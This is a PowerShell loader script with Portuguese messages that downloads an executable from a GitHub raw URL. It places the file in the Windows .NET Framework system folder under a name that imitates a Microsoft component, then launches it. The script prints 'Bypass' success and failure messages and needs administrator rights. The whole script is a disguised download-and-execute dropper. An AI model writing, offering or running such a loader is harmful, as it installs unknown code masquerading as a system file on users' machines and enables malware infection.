$diretorio = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319"
$url = "https://github.com/Spectreghost2k/speczumsas/raw/refs/heads/main/Microsoft.ServiceHub.Controller.exe"
$caminhoArquivo = Join-Path -Path $diretorio -ChildPath "Microsoft.ServiceHub.Controller.exe"

if (-not (Test-Path -Path $diretorio)) {
    Write-Host "Diretório não encontrado ou não é acessível. Certifique-se de executar o PowerShell como Administrador."
    exit
}

if (Test-Path $caminhoArquivo) {
    Start-Process $caminhoArquivo
} else {  
    try {
        Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo

        if (Test-Path $caminhoArquivo) {
            Write-Host "Completed 100% Bypass Open"
            Start-Process $caminhoArquivo
        } else {
            Write-Host "Falha no Bypass. Chame o Dev."
        }
    }
    catch {
        Write-Host "Falha no Bypass. Chame o Dev. Curl"
    }
}
